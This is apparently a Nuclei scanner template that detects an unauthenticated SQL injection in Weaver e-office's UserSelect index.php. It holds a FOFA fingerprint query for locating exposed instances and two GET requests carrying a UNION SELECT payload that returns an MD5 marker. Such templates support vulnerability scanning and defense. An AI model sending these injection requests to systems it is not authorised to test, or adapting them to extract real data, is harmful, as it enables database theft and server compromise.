id: Weaver-e-office-index_php-sql
info:
  name: 泛微e-office index.php sql注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: ((header="general/login/index.php" || body="/general/login/view//images/updateLoad.gif" || (body="szFeatures" && body="eoffice") || header="Server: eOffice") && body!="Server:    couchdb") || banner="general/login/index.php"
    泛微e-office index.php接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 此漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://mp.weixin.qq.com/s/XRNoDSC4Y9Pf7J3qySpnQg
  tags: sql injection


http:
  - raw:
      - |
        GET /E-mobile/App/System/UserSelect/index.php?m=getUserLists&privId=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5(123123))-- HTTP/1.1
        Host: {{Hostname}}
        
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '4297f44b13955235245b2497399d7a93'
      - type: status
        status: 
          - 200
  - raw:
      - |
        GET /App/System/UserSelect/index.php?m=getUserLists&privId=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5(123123))-- HTTP/1.1
        Host: {{Hostname}}
        
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '4297f44b13955235245b2497399d7a93'
      - type: status
        status: 
          - 200